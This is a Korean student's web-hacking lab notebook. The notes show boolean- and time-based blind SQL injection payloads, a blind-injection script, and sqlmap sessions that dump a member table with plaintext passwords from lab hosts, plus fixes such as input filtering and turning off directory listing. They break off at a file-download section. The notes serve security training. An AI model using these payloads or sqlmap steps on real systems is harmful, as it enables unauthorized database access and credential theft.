# 10.22 Boolean-Based Blind Injection 실습, Time-Based Blind SQL Injection, Sqlmap, Directory Listing, FILE Download & Upload 취약점, SSL Attack

### Boolean-Based Blind Injection 실습(145p)

- 강사 Web Page에 접속하여 다음 조건에 해당하는 테이블의 레코드를 알아내시오 (레코드느 1개만 존재)
  - W로 시작하는 데이터베이스
  - K로 시작하는 테이블
  - 강사 Web Page 주소 : 200.200.200.205



#### DB -> WebTest

#### Table -> 5글자

1. 몇글자인지 알아보기

' or ascii(substr((select table_name from information_schema.tables where table_schema='WebTest' limit 0,1),1,1)) = 0 #

 -> 로그인 실패
' or ascii(substr((select table_name from information_schema.tables where table_schema='WebTest' limit 0,1),2,1)) = 0 #

-> 로그인 실패

' or ascii(substr((select table_name from information_schema.tables where table_schema='WebTest' limit 0,1),3,1)) = 0 #

-> 로그인 실패.
.
.

' or ascii(substr((select table_name from information_schema.tables where table_schema='WebTest' limit 0,1)6,1)) = 0 #

 -> 로그인 성공 -> 글자수 5자리

=> 6자리



2. 무슨 글자인지 알아보기



' or ascii(substr((select table_name from information_schema.tables where table_schema='WebTest' limit 0,1),1,1)) = 75 # -> K

' or ascii(substr((select table_name from information_schema.tables where table_schema='WebTest' limit 0,1),2,1)) = 104 # -> h

' or ascii(substr((select table_name from information_schema.tables where table_schema='WebTest' limit 0,1),3,1)) = 55 # -> 7

' or ascii(substr((select table_name from information_schema.tables where table_schema='WebTest' limit 0,1),4,1)) = 102 # -> f

' or ascii(substr((select table_name from information_schema.tables where table_schema='WebTest' limit 0,1),5,1)) = 75 # -> K



=>  Kh7fK



#### Column 

1. 먼저 글자수를 알아야한다.

' or ascii(substr((select column_name from information_schema.columns where table_name='Kh7fK' limit 0,1),1,1)) = 0 # 

-> 로그인 실패

' or ascii(substr((select column_name from information_schema.columns where table_name='Kh7fK' limit 0,1),2,1)) = 0 # 

-> 로그인 실패

.

.

.

' or ascii(substr((select column_name from information_schema.columns where table_name='Kh7fK' limit 0,1),5,1)) = 0 # 

-> 로그인 성공 -> 컬럼명은 4글자구나

=> 4글자



2. 이름을 알아보자

' or ascii(substr((select column_name from information_schema.columns where table_name='Kh7fK' limit 0,1),1,1)) = 70 # -> F 

' or ascii(substr((select column_name from information_schema.columns where table_name='Kh7fK' limit 0,1),2,1)) = 108 # -> l

' or ascii(substr((select column_name from information_schema.columns where table_name='Kh7fK' limit 0,1),3,1)) = 97 # -> a

' or ascii(substr((select column_name from information_schema.columns where table_name='Kh7fK' limit 0,1),4,1)) = 103 # -> g



=> Flag 



#### Value 

1. 몇글자인지 알아보기

' or ascii(substr((select Flag from Kh7fK limit 0,1),0,1)) = 0 # -> 로그인 실패

' or ascii(substr((select Flag from Kh7fK limit 0,1),1,1)) = 0 # -> 로그인 실패

' or ascii(substr((select Flag from Kh7fK limit 0,1),2,1)) = 0 # -> 로그인 실패

.

.

.

' or ascii(substr((select Flag from Kh7fK limit 0,1),18,1)) = 0 # -> 로그인 성공 -> Value는 17글자구나



=> 17글자



2. 무슨 글자인지 알아보기

' or ascii(substr((select Flag from Kh7fK limit 0,1),1,1)) = 70 # -> F

' or ascii(substr((select Flag from Kh7fK limit 0,1),2,1)) = 117 # -> u

' or ascii(substr((select Flag from Kh7fK limit 0,1),3,1)) = 110 # -> n

' or ascii(substr((select Flag from Kh7fK limit 0,1),4,1)) = 95 # -> _

' or ascii(substr((select Flag from Kh7fK limit 0,1),5,1)) = 87 # -> W

' or ascii(substr((select Flag from Kh7fK limit 0,1),6,1)) = 101 # -> e

' or ascii(substr((select Flag from Kh7fK limit 0,1),7,1)) = 98 # -> b

' or ascii(substr((select Flag from Kh7fK limit 0,1),8,1)) = 95 # -> _

' or ascii(substr((select Flag from Kh7fK limit 0,1),9,1)) = 72 # -> H

' or ascii(substr((select Flag from Kh7fK limit 0,1),10,1)) = 97 # -> a

' or ascii(substr((select Flag from Kh7fK limit 0,1),11,1)) = 99 # -> c

' or ascii(substr((select Flag from Kh7fK limit 0,1),12,1)) = 107 # -> k

' or ascii(substr((select Flag from Kh7fK limit 0,1),13,1)) = 105 # -> i

' or ascii(substr((select Flag from Kh7fK limit 0,1),14,1)) = 110 # -> n

' or ascii(substr((select Flag from Kh7fK limit 0,1),15,1)) = 103 # -> g

' or ascii(substr((select Flag from Kh7fK limit 0,1),16,1)) = 63 # -> ?

' or ascii(substr((select Flag from Kh7fK limit 0,1),17,1)) = 33 # -> !



=> Fun_Web_Hacking?!



### Boolean-Based Blind Injection - Script (146p)

###### 칼리

root@kali-04:~/Desktop# vim first_blind.py

```
 172.16.10.20 으로 주소 3개 다 바꿔주기
```

root@kali-04:~/Desktop# python first_blind.py 

오류남 모듈부터 설치해주기



root@kali-04:~/Desktop# apt-get -y install python-pip

설치 확인

root@kali-04:~/Desktop# dpkg -l python-pip

```
Desired=Unknown/Install/Remove/Purge/Hold
| Status=Not/Inst/Conf-files/Unpacked/halF-conf/Half-inst/trig-aWait/Trig-pend
|/ Err?=(none)/Reinst-required (Status,Err: uppercase=bad)
||/ Name           Version       Architecture Description
+++-==============-=============-============-=================================
ii  python-pip     20.0.2-5kali1 all          Python package installer
```

root@kali-04:~/Desktop# pip install requests

다시

root@kali-04:~/Desktop# python first_blind.py 

```
[+] Blind SQL Injection
[+] Database Name Length Search
[+] Find Database Length [7]
[+] Database Name String Serach
W e b T e s t 
[+] Find Database String [WebTest]
[+] Table Name String Search
b o a r d , m e m b e r  
[+] Find Tables Name [board,member]
[+] Find Name String Search by [board] Table
s t r N u m b e r , s t r N a m e , s t r P a s s w o r d , s t r E m a i l , s t r S u b j e c t , s t r C o n t e n t , h t m l T a g , v i e w C o u n t , f i l e n a m e , f i l e s i z e , w r i t e D a t e  
[+] Find columns Name [strNumber,strName,strPassword,strEmail,strSubject,strContent,htmlTag,viewCount,filename,filesize,writeDate]
[+] Record String Search

```

board 랑 member 만 보려면 다시 vim first_blind.py 들어가서 맨 밑에table_names [0]을 다 1로 바꿔준다

다시 root@kali-04:~/Desktop# python first_blind.py  해보면

```
[+] Blind SQL Injection
[+] Database Name Length Search
[+] Find Database Length [7]
[+] Database Name String Serach
W e b T e s t 
[+] Find Database String [WebTest]
[+] Table Name String Search
b o a r d , m e m b e r  
[+] Find Tables Name [board,member]
[+] Find Name String Search by [member] Table
n o , u _ i d , u _ p a s s , u _ n a m e , n i c k n a m e , a g e , e m a i l , r e g _ d a t e  
[+] Find columns Name [no,u_id,u_pass,u_name,nickname,age,email,reg_date]
[+] Record String Search

```



### Time-Based Blind SQL Injection(147p)

###### WebHacker

[root@Linux-04 member]# mysql

```
mysql> select 1 and sleep(5); -> 참 이면 5초뒤에 
+----------------+
| 1 and sleep(5) |
+----------------+
|              0 |
+----------------+
1 row in set (5.00 sec)

mysql> select 0 and sleep(5); -> 거짓이면 바로 반환
+----------------+
| 0 and sleep(5) |
+----------------+
|              0 |
+----------------+
1 row in set (0.00 sec)


```

[root@Linux-04 member]# cd /var/www/html/member/
[root@Linux-04 member]# vim member_login_check.php

```
<?php
                session_start();
                require "../dbconn.php";

                $id=$_REQUEST["user_id"];
                $pw=$_REQUEST["user_pw"];

                if($id=="" && $pw==""){
                        echo "<script>
                                alert('아이디와 패스워드를 모두 입력해주세요.');
                                history.back();
                                </script>";
                        exit();
                }

                $strSQL="select * from member where u_id='".$id."' and u_pass='".$pw."';";
                $rs=mysql_query($strSQL,$conn);
                $rs_arr=mysql_fetch_array($rs);
                mysql_close($conn);

                //if($rs_arr['u_id'] == $id && $rs_arr['u_pass'] == $pw){
                if($rs_arr){
                        $_SESSION[user_id]=$rs_arr[u_id];
                        $_SESSION[nickname]=$rs_arr[nickname];

                        session_regenerate_id();
                        #setcookie("쿠키이름","쿠키값","만료시간","경로");
                        #setcookie("addcookie","P@ssw0rd",time() + 3600,"/");

                        echo "<script>
                                alert('환영합니다.'); -> 여기를 둘 다 환영합니다로 수정했음
                                location.replace('../index.php');
                                </script>";
                }
                else{
                        echo "<script>
                                alert('환영합니다.');  -> 여기를 둘 다 환영합니다로 수정했음
                                history.back();
                                </script>";
                }
?>

```

=> 이렇게 되면 로그인이 성공, 실패 모두 환영합니다 메세지가 뜬다.

이 경우 참인지 거짓인지 알아봐야하기 때문에 Time-Based Blind를 이용한다. 왜냐면 거짓이면 0초만에 답이오고 참이면 5초 후에 답이 오기 때문이다.



' or ascii(substr(database(),1,1)) = 87 and sleep(5) # -> 이렇게 하면 참이면 5초뒤에 뜨고 거짓이면 바로 메세지가 뜨겠죠@

' or ascii(substr(database(),1,1)) = 88 and sleep(5) # -> 이렇게 하면 거짓이라 메세지가 바로 뜸

그니까 코드 쓰고 뒤에 and sleep(3) 이런식으로 붙여주는게 Time-Based 방식



### Blind Injection - Tools (151p)

#### Sqlmap

###### 칼리

4  -> sqlmap

##### 취약점 (Injection Vector 확인)

root@kali-04:~# sqlmap - u "http://172.16.10.20/board/board_view.php?num=1" -p "num"

```
       ___
       __H__
 ___ ___[)]_____ ___ ___  {1.4.9#stable}
|_ -| . [,]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 14:39:20 /2020-10-22/

[14:39:21] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('PHPSESSID=p3gpa67qbg1...o78qod3rd1'). Do you want to use those [Y/n] y
[14:39:26] [INFO] checking if the target is protected by some kind of WAF/IPS
[14:39:26] [INFO] testing if the target URL content is stable
[14:39:27] [WARNING] target URL content is not stable (i.e. content differs). sqlmap will base the page comparison on a sequence matcher. If no dynamic nor injectable parameters are detected, or in case of junk results, refer to user's manual paragraph 'Page comparison'
how do you want to proceed? [(C)ontinue/(s)tring/(r)egex/(q)uit] c
[14:39:29] [WARNING] heuristic (basic) test shows that GET parameter 'num' might not be injectable
[14:39:29] [INFO] heuristic (XSS) test shows that GET parameter 'num' might be vulnerable to cross-site scripting (XSS) attacks
[14:39:29] [INFO] testing for SQL injection on GET parameter 'num'
[14:39:29] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[14:39:29] [WARNING] reflective value(s) found and filtering out
[14:39:30] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[14:39:30] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'                                                                                 
[14:39:30] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[14:39:30] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'                                                                                         
[14:39:30] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[14:39:30] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[14:39:30] [INFO] testing 'Generic inline queries'
[14:39:30] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[14:39:30] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[14:39:30] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[14:39:30] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[14:39:50] [INFO] GET parameter 'num' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable                                                                           
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] y
[14:40:01] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[14:40:01] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[14:40:02] [INFO] target URL appears to be UNION injectable with 11 columns
[14:40:02] [INFO] GET parameter 'num' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
GET parameter 'num' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y
sqlmap identified the following injection point(s) with a total of 99 HTTP(s) requests:
---
Parameter: num (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: num=1 AND (SELECT 1937 FROM (SELECT(SLEEP(5)))mvSW)

    Type: UNION query
    Title: Generic UNION query (NULL) - 11 columns
    Payload: num=-7367 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b7a7a71,0x4d5a4a437959714c74746f48517664794f6f4c734e7866545567667464654e726d5a5542464e5977,0x7178717071),NULL,NULL,NULL-- -
---
[14:40:03] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.12
[14:40:03] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/172.16.10.20'                                                                                     

[*] ending @ 14:40:03 /2020-10-22/


```

y -> c -> 나오는거 다 y



##### DB 명 확인

root@kali-04:~# sqlmap -u "http://172.16.10.20/board/board_view.php?num=1" -p "num" --dbs

```
       ___
       __H__                                                                                   
 ___ ___["]_____ ___ ___  {1.4.9#stable}                                                       
|_ -| . [(]     | .'| . |                                                                      
|___|_  [)]_|_|_|__,|  _|                                                                      
      |_|V...       |_|   http://sqlmap.org                                                    

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 14:40:08 /2020-10-22/

[14:40:08] [INFO] resuming back-end DBMS 'mysql' 
[14:40:08] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('PHPSESSID=66tb0unttkr...pu0qaj57a1'). Do you want to use those [Y/n] y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: num (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: num=1 AND (SELECT 1937 FROM (SELECT(SLEEP(5)))mvSW)

    Type: UNION query
    Title: Generic UNION query (NULL) - 11 columns
    Payload: num=-7367 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b7a7a71,0x4d5a4a437959714c74746f48517664794f6f4c734e7866545567667464654e726d5a5542464e5977,0x7178717071),NULL,NULL,NULL-- -
---
[14:40:10] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.12
[14:40:10] [INFO] fetching database names
[14:40:10] [WARNING] reflective value(s) found and filtering out
[14:40:10] [INFO] retrieved: 'information_schema'
[14:40:10] [INFO] retrieved: 'WebTest'
[14:40:10] [INFO] retrieved: 'mysql'
[14:40:10] [INFO] retrieved: 'test'
available databases [4]:                                                                      
[*] information_schema
[*] mysql
[*] test
[*] WebTest

[14:40:10] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/172.16.10.20'                                                                                     

[*] ending @ 14:40:10 /2020-10-22/


```



##### Table 명 확인

root@kali-04:~# sqlmap -u "http://172.16.10.20/board/board_view.php?num=1" -p "num" -D "WebTest" --tables

```
 root@kali-04:~# sqlmap -u "http://172.16.10.20/board/board_view.php?num=1" -p "num" -D "WebTest" --tables
        ___
       __H__                                                                                   
 ___ ___[,]_____ ___ ___  {1.4.9#stable}                                                       
|_ -| . ["]     | .'| . |                                                                      
|___|_  [)]_|_|_|__,|  _|                                                                      
      |_|V...       |_|   http://sqlmap.org                                                    

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 14:40:38 /2020-10-22/

[14:40:38] [INFO] resuming back-end DBMS 'mysql' 
[14:40:38] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('PHPSESSID=kj6d798u46e...36cefrgae5'). Do you want to use those [Y/n] y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: num (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: num=1 AND (SELECT 1937 FROM (SELECT(SLEEP(5)))mvSW)

    Type: UNION query
    Title: Generic UNION query (NULL) - 11 columns
    Payload: num=-7367 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b7a7a71,0x4d5a4a437959714c74746f48517664794f6f4c734e7866545567667464654e726d5a5542464e5977,0x7178717071),NULL,NULL,NULL-- -
---
[14:40:43] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.12
[14:40:43] [INFO] fetching tables for database: 'WebTest'
[14:40:43] [WARNING] reflective value(s) found and filtering out
[14:40:43] [INFO] retrieved: 'board'
[14:40:43] [INFO] retrieved: 'member'
Database: WebTest                                                                             
[2 tables]
+--------+
| member |
| board  |
+--------+

[14:40:43] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/172.16.10.20'                                                                                     

[*] ending @ 14:40:43 /2020-10-22/

```

##### Column 명 확인

member 확인

root@kali-04:~# sqlmap -u "http://172.16.10.20/board/board_view.php?num=1" -p "num" -T "member" --columns

```

       ___
       __H__                                                                                   
 ___ ___[.]_____ ___ ___  {1.4.9#stable}                                                       
|_ -| . [)]     | .'| . |                                                                      
|___|_  [.]_|_|_|__,|  _|                                                                      
      |_|V...       |_|   http://sqlmap.org                                                    

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 14:45:03 /2020-10-22/

[14:45:03] [INFO] resuming back-end DBMS 'mysql' 
[14:45:03] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('PHPSESSID=91v25j3k3vm...2849gun936'). Do you want to use those [Y/n] y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: num (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: num=1 AND (SELECT 1937 FROM (SELECT(SLEEP(5)))mvSW)

    Type: UNION query
    Title: Generic UNION query (NULL) - 11 columns
    Payload: num=-7367 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b7a7a71,0x4d5a4a437959714c74746f48517664794f6f4c734e7866545567667464654e726d5a5542464e5977,0x7178717071),NULL,NULL,NULL-- -
---
[14:45:07] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.12
[14:45:07] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) columns
[14:45:07] [INFO] fetching current database
[14:45:07] [WARNING] reflective value(s) found and filtering out
[14:45:07] [INFO] fetching columns for table 'member' in database 'WebTest'
[14:45:07] [INFO] retrieved: 'no','int(11)'
[14:45:07] [INFO] retrieved: 'u_id','varchar(20)'
[14:45:07] [INFO] retrieved: 'u_pass','varchar(50)'
[14:45:07] [INFO] retrieved: 'u_name','varchar(20)'
[14:45:07] [INFO] retrieved: 'nickname','char(20)'
[14:45:07] [INFO] retrieved: 'age','int(11)'
[14:45:07] [INFO] retrieved: 'email','char(50)'
[14:45:07] [INFO] retrieved: 'reg_date','datetime'
Database: WebTest                                                                             
Table: member
[8 columns]
+----------+-------------+
| Column   | Type        |
+----------+-------------+
| no       | int(11)     |
| age      | int(11)     |
| email    | char(50)    |
| nickname | char(20)    |
| reg_date | datetime    |
| u_id     | varchar(20) |
| u_name   | varchar(20) |
| u_pass   | varchar(50) |
+----------+-------------+

[14:45:07] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/172.16.10.20'                                                                                     

[*] ending @ 14:45:07 /2020-10-22/

```

Board 테이블 확인

root@kali-04:~# sqlmap -u "http://172.16.10.20/board/board_view.php?num=1" -p "num" -T "member" --columns

```

        ___
       __H__                                                                                   
 ___ ___[)]_____ ___ ___  {1.4.9#stable}                                                       
|_ -| . [,]     | .'| . |                                                                      
|___|_  ["]_|_|_|__,|  _|                                                                      
      |_|V...       |_|   http://sqlmap.org                                                    

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 14:46:52 /2020-10-22/

[14:46:53] [INFO] resuming back-end DBMS 'mysql' 
[14:46:53] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('PHPSESSID=ffiprr2fuql...cvnb2vv4m6'). Do you want to use those [Y/n] y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: num (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: num=1 AND (SELECT 1937 FROM (SELECT(SLEEP(5)))mvSW)

    Type: UNION query
    Title: Generic UNION query (NULL) - 11 columns
    Payload: num=-7367 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b7a7a71,0x4d5a4a437959714c74746f48517664794f6f4c734e7866545567667464654e726d5a5542464e5977,0x7178717071),NULL,NULL,NULL-- -
---
[14:46:56] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.12
[14:46:56] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) columns
[14:46:56] [INFO] fetching current database
[14:46:56] [INFO] fetching columns for table 'member' in database 'WebTest'
[14:46:56] [INFO] resumed: 'no','int(11)'
[14:46:56] [INFO] resumed: 'u_id','varchar(20)'
[14:46:56] [INFO] resumed: 'u_pass','varchar(50)'
[14:46:56] [INFO] resumed: 'u_name','varchar(20)'
[14:46:56] [INFO] resumed: 'nickname','char(20)'
[14:46:56] [INFO] resumed: 'age','int(11)'
[14:46:56] [INFO] resumed: 'email','char(50)'
[14:46:56] [INFO] resumed: 'reg_date','datetime'
Database: WebTest                                                                             
Table: member
[8 columns]
+----------+-------------+
| Column   | Type        |
+----------+-------------+
| no       | int(11)     |
| age      | int(11)     |
| email    | char(50)    |
| nickname | char(20)    |
| reg_date | datetime    |
| u_id     | varchar(20) |
| u_name   | varchar(20) |
| u_pass   | varchar(50) |
+----------+-------------+

[14:46:56] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/172.16.10.20'                                                                                     

[*] ending @ 14:46:56 /2020-10-22/

```



##### Value 확인

member 확인

root@kali-04:~# sqlmap -u "http://172.16.10.20/board/board_view.php?num=1" -p "num" -T "member" --dump

```
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.4.9#stable}
|_ -| . [']     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 14:48:11 /2020-10-22/

[14:48:11] [INFO] resuming back-end DBMS 'mysql' 
[14:48:11] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('PHPSESSID=9nmb2n31943...vuah5b2ms4'). Do you want to use those [Y/n] y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: num (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: num=1 AND (SELECT 1937 FROM (SELECT(SLEEP(5)))mvSW)

    Type: UNION query
    Title: Generic UNION query (NULL) - 11 columns
    Payload: num=-7367 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b7a7a71,0x4d5a4a437959714c74746f48517664794f6f4c734e7866545567667464654e726d5a5542464e5977,0x7178717071),NULL,NULL,NULL-- -
---
[14:48:19] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.12
[14:48:19] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
[14:48:19] [INFO] fetching current database
[14:48:19] [INFO] fetching columns for table 'member' in database 'WebTest'
[14:48:19] [INFO] resumed: 'no','int(11)'
[14:48:19] [INFO] resumed: 'u_id','varchar(20)'
[14:48:19] [INFO] resumed: 'u_pass','varchar(50)'
[14:48:19] [INFO] resumed: 'u_name','varchar(20)'
[14:48:19] [INFO] resumed: 'nickname','char(20)'
[14:48:19] [INFO] resumed: 'age','int(11)'
[14:48:19] [INFO] resumed: 'email','char(50)'
[14:48:19] [INFO] resumed: 'reg_date','datetime'
[14:48:19] [INFO] fetching entries for table 'member' in database 'WebTest'                   
[14:48:19] [WARNING] reflective value(s) found and filtering out
[14:48:19] [INFO] retrieved: '1','30','admine@kh.com','멍청이','2020-10-16 17:04:50','tester','...
[14:48:19] [INFO] retrieved: '2','0','','관리자','2020-10-16 17:04:50','admin','관리자','P@ssw0rd'                                                                                            
[14:48:19] [INFO] retrieved: '3',' ',' ','이지','0000-00-00 00:00:00','easy','','12'
[14:48:19] [INFO] retrieved: '5','24','hacker@kh.com','해커','2020-10-21 14:38:33','hacker','해...
Database: WebTest                                                                             
Table: member
[4 entries]
+--------+------+------+---------------+---------+-------------+----------+---------------------+
| u_id   | age  | no   | email         | u_name  | u_pass      | nickname | reg_date            |
+--------+------+------+---------------+---------+-------------+----------+---------------------+
| tester | 30   | 1    | admine@kh.com | 테스터  | qwer1234    | 멍청이   | 2020-10-16 17:04:50 |
| admin  | 0    | 2    | <blank>       | 관리자  | P@ssw0rd    | 관리자   | 2020-10-16 17:04:50 |
| easy   | NULL | 3    | NULL          | <blank> | 12          | 이지     | 0000-00-00 00:00:00 |
| hacker | 24   | 5    | hacker@kh.com | 해커    | keroro2424. | 해커     | 2020-10-21 14:38:33 |
+--------+------+------+---------------+---------+-------------+----------+---------------------+

[14:48:19] [INFO] table 'WebTest.`member`' dumped to CSV file '/root/.local/share/sqlmap/output/172.16.10.20/dump/WebTest/member.csv'                                                         
[14:48:19] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/172.16.10.20'                                                                                     

[*] ending @ 14:48:19 /2020-10-22/

```

board 확인

root@kali-04:~# sqlmap -u "http://172.16.10.20/board/board_view.php?num=1" -p "num" -T "board" --dump

```
값이 너무 많아요 이건
```



값만 보려면

root@kali-04:~# cat /root/.local/share/sqlmap/output/172.16.10.20/dump/WebTest/member.csv

```
root@kali-04:~# cat /root/.local/share/sqlmap/output/172.16.10.20/dump/WebTest/member.csv
u_id,age,no,email,u_name,u_pass,nickname,reg_date
tester,30,1,admine@kh.com,테스터,qwer1234,멍청이,2020-10-16 17:04:50
admin,0,2,<blank>,관리자,P@ssw0rd,관리자,2020-10-16 17:04:50
easy,NULL,3,NULL,<blank>,12,이지,0000-00-00 00:00:00
hacker,24,5,hacker@kh.com,해커,keroro2424.,해커,2020-10-21 14:38:33


```

[root@Linux-04 member]# cd ../
[root@Linux-04 html]# vim dbconn.php



### magic_quotes_gpc (158p)

[root@Linux-04 html]# vim /etc/php.ini

```
 745 magic_quotes_gpc = On  // off -> on 으로 바꿈

```

[root@Linux-04 html]# service httpd restart

하면 홈페이지 게시판 검색 창에  [\] 이렇게 나옴



### 다른거

[root@Linux-04 html]# vim member/member_login_check.php 

```
<?php
                session_start();
                require "../dbconn.php";

                $id=$_REQUEST["user_id"];
                $pw=$_REQUEST["user_pw"];

                $id = preg_replace("/select|union|or|order/i","",$id); -> 이거 추가해줌
                if($id=="" && $pw==""){
                        echo "<script>
                                alert('아이디와 패스워드를 모두 입력해주세요.');
                                history.back();
                                </script>";
                        exit();
                }

                $strSQL="select * from member where u_id='".$id."' and u_pass='".$pw."';";
                $rs=mysql_query($strSQL,$conn);
                $rs_arr=mysql_fetch_array($rs);
                mysql_close($conn);

                //if($rs_arr['u_id'] == $id && $rs_arr['u_pass'] == $pw){
                if($rs_arr){
                        $_SESSION[user_id]=$rs_arr[u_id];
                        $_SESSION[nickname]=$rs_arr[nickname];

                        session_regenerate_id();                        
                        #setcookie("쿠키이름","쿠키값","만료시간","경로");
                        #setcookie("addcookie","P@ssw0rd",time() + 3600,"/");

                        echo "<script>
                                alert('로그인 되었습니다.');
                                location.replace('../index.php');
                                </script>";
                }
                else{
                        echo "<script>
                                alert('아이디 또는 패스워드가 일치하지 않습니다.');
                                history.back();
                                </script>";
                }
?>

```

-> 이렇게 하면 로그인 안됨



### Directory Listing (162p)

홈페이지에

http://172.16.10.20/member/ 치면 구조가 나옴

클릭시 php 파일 다운로드도 가능

```
Index of /member
[ICO]	Name	Last modified	Size	Description
[DIR]	Parent Directory	 	-	 
[TXT]	member_info.php	21-Oct-2020 10:20	3.5K	 
[TXT]	member_info_change.php	21-Oct-2020 10:22	1.1K	 
[TXT]	member_login.php	21-Oct-2020 17:18	1.3K	 
[TXT]	member_login_check.php	22-Oct-2020 15:17	1.0K	 
[TXT]	member_logout.php	19-Oct-2020 16:09	354	 
[TXT]	member_nick.php	20-Oct-2020 18:08	2.8K	 
[TXT]	member_nick_change.php	20-Oct-2020 18:11	1.8K	 
[TXT]	member_register.php	10-Jun-2017 21:43	3.3K	 
[TXT]	member_register_ok.php	10-Jun-2017 21:43	863	 
Apache Server at 172.16.10.20 Port 80

-> 이런식으로 나옴
```



[root@Linux-04 html]# vim /etc/httpd/conf/httpd.conf

```
 331     Options Indexes FollowSymLinks

-> 이게 있어야 Listing 이 되는거임 
한번 지워봄

 331     Options FollowSymLinks

```

[root@Linux-04 html]# service httpd restart

하고 다시 홈페이지 가서 http://172.16.10.20/member/ 하면 막힘

```
Forbidden
You don't have permission to access /member/ on this server.

Apache Server at 172.16.10.20 Port 80
```



FILE Download  취약점 (164p)

칼리가 필요함

###### 칼리

Burp 실행하기

해커로 로그인 후 게시판에 첨부파일 넣어서 글 하나 써보기



######  WebHacker

[root@Linux-04 html]# cd /var/www/html/board
[root@Linux-04 board]# ls -l

```
합계 28
